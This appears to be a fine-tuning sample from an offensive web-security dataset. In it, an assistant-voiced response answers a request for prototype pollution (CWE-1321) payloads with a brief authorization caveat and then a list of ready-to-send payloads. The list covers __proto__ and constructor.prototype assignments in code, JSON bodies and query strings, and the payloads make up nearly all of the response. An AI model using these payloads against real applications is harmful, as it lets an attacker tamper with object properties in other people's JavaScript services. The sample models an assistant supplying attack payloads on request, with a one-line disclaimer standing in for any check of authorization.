# PROTO_POLLUTION — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: proto_pollution
- cwe: CWE-1321

## Scenario

I need to craft Prototype Pollution payloads via Prototype Pollution Payloads. What should I know and what do I send?

## Analysis / Response

**Prototype Pollution Payloads** — this technique applies to Prototype Pollution. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```
